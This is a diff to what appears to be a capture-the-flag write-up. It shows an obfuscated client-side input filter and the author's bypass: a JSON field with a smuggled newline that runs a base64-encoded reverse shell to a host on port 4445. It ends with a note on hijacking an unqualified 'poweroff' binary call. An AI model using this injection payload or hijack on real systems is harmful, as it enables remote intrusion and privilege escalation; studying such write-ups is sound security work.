@@ -71,7 +71,7 @@ JS filter code :
 var _0x48ef=['keyup','value','target','preventDefault','addEventListener','test','keyCode'];(function(_0x57ee59,_0x48ef0f){var _0x2911af=function(_0x4f1ea3){while(--_0x4f1ea3){_0x57ee59['push'](_0x57ee59['shift']());}};_0x2911af(++_0x48ef0f);}(_0x48ef,0x1d5));var _0x2911=function(_0x57ee59,_0x48ef0f){_0x57ee59=_0x57ee59-0x0;var _0x2911af=_0x48ef[_0x57ee59];return _0x2911af;};window['onload']=function(){var _0x31dff8=document['getElementById'](_0x2911('0x2'));_0x31dff8[_0x2911('0x1')]='';_0x31dff8[_0x2911('0x4')](_0x2911('0x0'),function(_0x18bdaf){if(_0x18bdaf[_0x2911('0x6')]===0xd){_0x18bdaf[_0x2911('0x3')]();submit();}if(/^[A-Za-z0-9. ]*$/[_0x2911('0x5')](_0x31dff8[_0x2911('0x1')])==![]){_0x31dff8[_0x2911('0x1')]='';}});};
 
 
-How I bypass the filter to get a reverse shell as www-data
+This is how I bypass the filter to get a reverse shell as www-data
 
 {"target":"\" \necho L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIxLjc4LjE0Mi80NDQ1IDA+JjEK | base64 -d | bash\n"}
 
@@ -129,7 +129,7 @@ _ITM_registerTMCloneTable
 AWAVI
 AUATL
 []A\A]A^A_
-poweroff => the binary poweroff isn't in absolut path so we canbinary hidjacking
+poweroff => the binary poweroff isn't in absolut path so we can binary hidjacking
 ;*3$"
 
 vim poweroff
